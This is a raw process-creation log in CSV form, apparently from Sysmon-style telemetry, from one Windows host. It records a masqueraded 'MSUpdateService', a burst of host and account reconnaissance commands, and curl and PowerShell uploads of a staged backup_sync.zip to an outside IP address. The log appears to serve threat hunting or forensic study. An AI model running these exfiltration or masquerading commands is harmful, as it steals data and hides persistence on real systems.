"Sep 16, 2025 3:39:45 PM",slflarewinsysmo,slflare,sc.exe,"sc.exe  description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""",cmd.exe,"""cmd.exe"" /c ""sc.exe description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""""",159.26.106.84
"Sep 16, 2025 3:40:28 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c systeminfo",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:28 PM",slflarewinsysmo,slflare,systeminfo.exe,systeminfo,cmd.exe,"""cmd.exe"" /c systeminfo",159.26.106.84
"Sep 16, 2025 3:40:34 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""whoami /all""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:34 PM",slflarewinsysmo,slflare,whoami.exe,whoami  /all,cmd.exe,"""cmd.exe"" /c ""whoami /all""",159.26.106.84
"Sep 16, 2025 3:40:35 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""net user""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:35 PM",slflarewinsysmo,slflare,net.exe,net  user,cmd.exe,"""cmd.exe"" /c ""net user""",159.26.106.84
"Sep 16, 2025 3:40:36 PM",slflarewinsysmo,slflare,net1.exe,net1  user,net.exe,net  user,159.26.106.84
"Sep 16, 2025 3:40:37 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""net localgroup administrators""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:37 PM",slflarewinsysmo,slflare,net.exe,net  localgroup administrators,cmd.exe,"""cmd.exe"" /c ""net localgroup administrators""",159.26.106.84
"Sep 16, 2025 3:40:37 PM",slflarewinsysmo,slflare,net1.exe,net1  localgroup administrators,net.exe,net  localgroup administrators,159.26.106.84
"Sep 16, 2025 3:40:38 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""ipconfig /all""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:38 PM",slflarewinsysmo,slflare,ipconfig.exe,ipconfig  /all,cmd.exe,"""cmd.exe"" /c ""ipconfig /all""",159.26.106.84
"Sep 16, 2025 3:40:39 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""netstat -ano""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:39 PM",slflarewinsysmo,slflare,NETSTAT.EXE,netstat  -ano,cmd.exe,"""cmd.exe"" /c ""netstat -ano""",159.26.106.84
"Sep 16, 2025 3:40:41 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""tasklist /svc""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:41 PM",slflarewinsysmo,slflare,tasklist.exe,tasklist  /svc,cmd.exe,"""cmd.exe"" /c ""tasklist /svc""",159.26.106.84
"Sep 16, 2025 3:40:42 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""wmic computersystem get domain""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:42 PM",slflarewinsysmo,slflare,WMIC.exe,wmic  computersystem get domain,cmd.exe,"""cmd.exe"" /c ""wmic computersystem get domain""",159.26.106.84
"Sep 16, 2025 3:40:44 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""query user""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:44 PM",slflarewinsysmo,slflare,query.exe,query  user,cmd.exe,"""cmd.exe"" /c ""query user""",159.26.106.84
"Sep 16, 2025 3:40:44 PM",slflarewinsysmo,slflare,quser.exe,quser.exe,query.exe,query  user,159.26.106.84
"Sep 16, 2025 3:42:04 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:42:04 PM",slflarewinsysmo,slflare,cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:42:45 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:43:11 PM",slflarewinsysmo,slflare,ngentask.exe,"""NGenTask.exe"" /StopEvent:1408",ngentask.exe,"""NGenTask.exe"" /RuntimeWide /StopEvent:2052",159.26.106.84
"Sep 16, 2025 3:43:11 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,ngentask.exe,"""NGenTask.exe"" /StopEvent:1408",159.26.106.84
"Sep 16, 2025 3:43:12 PM",slflarewinsysmo,slflare,ngentask.exe,"""NGenTask.exe"" /StopEvent:1320",ngentask.exe,"""NGenTask.exe"" /RuntimeWide /StopEvent:2004",159.26.106.84
"Sep 16, 2025 3:43:12 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,ngentask.exe,"""NGenTask.exe"" /StopEvent:1320",159.26.106.84
"Sep 16, 2025 3:43:20 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:43:20 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",159.26.106.84
"Sep 16, 2025 3:43:21 PM",slflarewinsysmo,slflare,curl.exe,"curl  -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",159.26.106.84
"Sep 16, 2025 3:43:28 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:43:28 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",159.26.106.84
"Sep 16, 2025 3:43:28 PM",slflarewinsysmo,slflare,powershell.exe,"powershell  -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",159.26.106.84
"Sep 16, 2025 3:43:35 PM",slflarewinsysmo,slflare,SecurityHealthHost.exe,SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:43:43 PM",slflarewinsysmo,slflare,taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:44:38 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:13 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:13 PM",slflarewinsysmo,slflare,cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:13 PM",slflarewinsysmo,slflare,TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:46:15 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:46:30 PM",slflarewinsysmo,slflare,DismHost.exe,dismhost.exe {A456061A-6E36-43C1-BBF6-9B3F96B96271},cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",159.26.106.84
"Sep 16, 2025 3:46:45 PM",slflarewinsysmo,slflare,OneDriveStandaloneUpdater.exe,"""OneDriveStandaloneUpdater.exe"" /reporting",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:54 PM",slflarewinsysmo,slflare,TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:46:55 PM",slflarewinsysmo,slflare,rdpclip.exe,rdpclip,svchost.exe,svchost.exe -k NetworkService,159.26.106.84
"Sep 16, 2025 3:46:56 PM",slflarewinsysmo,slflare,taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:59 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:47:01 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe KEYROAMING,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:47:26 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:47:48 PM",slflarewinsysmo,slflare,TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:47:50 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:47:52 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe KEYROAMING,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:57:47 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 4:13:28 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
